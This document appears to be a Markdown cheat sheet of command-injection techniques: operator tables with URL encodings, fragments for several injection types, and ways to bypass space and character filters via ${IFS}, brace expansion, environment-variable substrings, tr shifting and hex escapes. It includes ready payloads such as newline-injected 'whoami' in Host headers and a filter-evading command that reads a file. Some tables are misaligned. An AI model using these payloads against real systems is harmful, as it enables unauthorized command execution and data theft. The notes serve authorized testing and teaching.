
### Basic Command Injection Methods

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                             |                                      |                                |
| ------------------ | ------------------- | --------------------- | -------------------------------------------- | ------------------------------------ | ------------------------------ |
| Semicolon          | `;`                 | `%3b`                 | `Both`                                       |                                      |                                |
| New Line           | `\n`                | `%0a`                 | `Both`                                       |                                      |                                |
| Background         | `&`                 | `%26`                 | `Both (second output generally shown first)` |                                      |                                |
| Pipe          |     `\|`                                       | `%7c`                                        | `Both (only second output is shown)` |                                |
| AND                | `&&`                | `%26%26`              | `Both (only if first succeeds)`              |                                      |                                |
| OR                |                   `\|\|`                       |                                             | `%7c%7c`                             | `Second (only if first fails)` |
| Sub-Shell          | <code>``</code>     | `%60%60`              | `Both` *(Linux-only)*                        |                                      |                                |
| Sub-Shell          | `` `$()` ``         | `%24%28%29`           | `Both` *(Linux-only)*                        |                                      |                                |

---


```markdown
| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
| --- | --- | --- | --- |
| Semicolon | `;` | `%3b` | `Both` |
| New Line | `\n` | `%0a` | `Both` |
| Background | `&` | `%26` | `Both (second output generally shown first)` |
| Pipe | `|` | `%7c` | `Both (only second output is shown)` |
| AND | `&&` | `%26%26` | `Both (only if first succeeds)` |
| OR | `||` | `%7c%7c` | `Second (only if first fails)` |
| Sub-Shell | <code>&#96;&#96;</code> | `%60%60` | `Both` *(Linux-only)* |
| Sub-Shell | `` `$()` `` | `%24%28%29` | `Both` *(Linux-only)* |
```

# Injection Operators — Quick Reference

Below is a compact Markdown table of common operators/payload fragments used in various injection classes (SQL, LDAP, XSS, SSRF, XXE, etc.). Use this as a reference when testing or hardening input-handling.

> **Warning:** These strings can be dangerous when executed in vulnerable systems — use only in authorized testing environments.

| Injection Type                            | Common Operators / Fragments                             |    |
| ----------------------------------------- | -------------------------------------------------------- | -- |
| SQL Injection                             | `'`, `;`, `--`, `/* */`                                  |    |
| Command Injection                         | `;`, `&&`                                                |    |
| LDAP Injection                            | `*`, `(`, `)`, `&`, ``                                   | `` |
| XPath Injection                           | `'`, `or`, `and`, `not`, `substring`, `concat`, `count`  |    |
| OS Command Injection                      | `;`, `&`, ``                                             | `` |
| Code Injection                            | `'`, `;`, `--`, `/* */`, `$()`, `${}`, `#{}`, `%{}`, `^` |    |
| Directory Traversal / File Path Traversal | `../`, `..\\`, `%00`                                     |    |
| Object Injection                          | `;`, `&`, ``                                             | `` |
| XQuery Injection                          | `'`, `;`, `--`, `/* */`                                  |    |
| Shellcode Injection                       | `\x`, `\u`, `%u`, `%n`                                   |    |
| Header Injection                          | `\n`, `\r\n`, `\t`, `%0d`, `%0a`, `%09`                  |    |


# Bypassing Space Filters — Notes & Examples

> Quick MD reference showing common ways attackers replace or bypass space characters in inputs (useful for command-injection testing). **Only use these techniques in authorized tests**.

---

## Concept

When spaces are blacklisted (e.g., an input should be an IP address), attackers replace spaces with other characters or constructs that the shell (or interpreter) will treat as separators. Common approaches: percent-encoding, control characters, environment variables, shell expansion, and alternate whitespace characters (tabs, newlines).

---

## Common bypasses (with examples)

| Bypass                             |      Example payload (URL encoded where relevant) | Why it works                                                                                        |
| ---------------------------------- | ------------------------------------------------: | --------------------------------------------------------------------------------------------------- |
| Newline (as injection operator)    |                              `127.0.0.1%0awhoami` | `\n` can terminate headers / inject new command lines; often not filtered.                          |
| Tab instead of space               | `127.0.0.1%0a%09whoami` or `127.0.0.1%0a\twhoami` | Shells accept tabs as argument separators. `%09` is URL-encoded TAB.                                |
| `$IFS` environment variable        |                        `127.0.0.1%0a${IFS}whoami` | `$IFS` expands to a space (and tab/newline by default), so `${IFS}` becomes a separator at runtime. |
| Brace expansion (no literal space) |      `127.0.0.1%0a{ls,-la}` → expands to `ls -la` | Bash brace expansion creates separate arguments without using literal spaces.                       |
| Percent-encoded space variants     |                  `+` or `%20` (sometimes blocked) | `+` is decoded to a space in URL contexts; servers may normalize or block differently.              |
| Mixed encodings / double-encoding  |                    `%2520` (double-encoded `%20`) | Some filters decode only once; double-encoding can slip through naive filters.                      |
| Other whitespace Unicode           | `U+00A0` (non-breaking space) or other whitespace | Some parsers treat Unicode whitespace as separators while filters only block ASCII space.           |

---

## Example HTTP header test snippets

(assume `Host:` header vulnerable to injection)

```http
Host: 127.0.0.1%0awhoami
Host: 127.0.0.1%0a%09whoami    # newline + tab
Host: 127.0.0.1%0a${IFS}whoami # newline + $IFS
Host: 127.0.0.1%0a{ls,-la}     # newline + brace expansion
```

---

## Practical tips for testers

* Try percent-encoding (`%0a`, `%09`, `%20`) and literal control chars where the client allows.
* Test double-encoding (`%25` + code) if single decode filters exist.
* Test environment variable expansions (`$IFS`, `${IFS}`) when the target spawns a shell.
* Try shell expansions (brace expansion, process substitution) for bash-specific targets.
* Use tabs and newline characters — many filters forget them.
* Observe server behavior: "Invalid input" often indicates server-side filtering; change only one character at a time while testing.

---
# Quick Guide — Bypassing Other Blacklisted Characters (slashes, semicolons, etc.)

Short, practical reference for techniques that let you produce characters that are blocked ( `/` `\` `;` etc. ). Only use in authorized testing.

---

## 1) Use environment-variable substring (Linux)

Many env vars contain the character you need. Take a 1-char slice.

```bash
# PATH often begins with "/"
echo "${PATH:0:1}"     # -> /

# LS_COLORS may contain a ';'
echo "${LS_COLORS:10:1}"  # -> ;
```

Use the same notation inside an injected payload (no `echo` needed):

```
127.0.0.1%0a${PATH:0:1}usr${PATH:0:1}bin
```

---

## 2) Use environment-variable substring (Windows CMD)

CMD supports substring syntax `%VAR:~start,length%`.

```cmd
:: HOMEPATH looks like \Users\name
echo %HOMEPATH:~0,1%   :: -> '\'
:: complex example from prompt
echo %HOMEPATH:~6,-11% :: -> '\'
```

PowerShell indexing (env vars as arrays / strings):

```powershell
$env:HOMEPATH[0]   # -> '\'
$env:PROGRAMFILES[10]  # example: single-character access
```

Use these inside payloads where Windows cmd expands env vars.

---

## 3) Character shifting (tr hack, Linux)

Shift input chars by +1 using `tr` mapping. Find the character *before* your target in ASCII, then shift.

Example: produce `\` (92) by giving `[` (91):

```bash
# map '!-}' -> '"-~' (shifts bytes by +1)
echo $(tr '!-}' '"-~' <<< '[')   # -> '\'
```

To get `;` (59), use the char before it (`:` / 58):

```bash
echo $(tr '!-}' '"-~' <<< ':')   # -> ';'
```

(You can embed this style in payloads if the target executes shell commands.)

---

## 4) Hex / escape sequences (printf / echo -e)

When direct characters are blocked, use hex escapes.

Linux shell:

```bash
# slash
printf '\x2f'   # -> /

# backslash
printf '\x5c'   # -> \

# semicolon
printf '\x3b'   # -> ;
```

Some languages/processors accept `$'\xNN'` notation too:

```bash
echo $'\x2f'   # -> /
```

---

## 5) URL / percent encodings & double-encoding

Encode the character and try single or double decode bypasses:

* `/` -> `%2f` or `%2F`
* `/` double-encoded -> `%252f` (server decodes once -> `%2f` -> decoded later -> `/`)

Some middlewares only decode once — double-encoding can bypass naive filters.

---

## 6) Alternate whitespace & separators

(Useful when slash is used to separate path components with spaces around them)

* Use `${IFS}` for spaces and tabs
* Use tab `%09` or literal `\t` rather than ASCII space
* Use brace expansion to avoid literal separators: `{ls,-la}` -> `ls -la`

---

## 7) Combine tricks

You can compose techniques. Example: produce a path without `/` literal by inserting `${PATH:0:1}` for slashes and `${IFS}` for spaces:

```
127.0.0.1%0acat${IFS}${HOME}${PATH:0:1}secret.txt
```

---

## 8) Exercise / quick answer hint

**Exercise:** produce `;` using character shifting.

* Semicolon `;` ASCII = 59 → character before is `:` (58).
* Use the `tr '!-}' '"-~'` trick with `:` as input:

```bash
echo $(tr '!-}' '"-~' <<< ':')   # outputs ';'
```

---




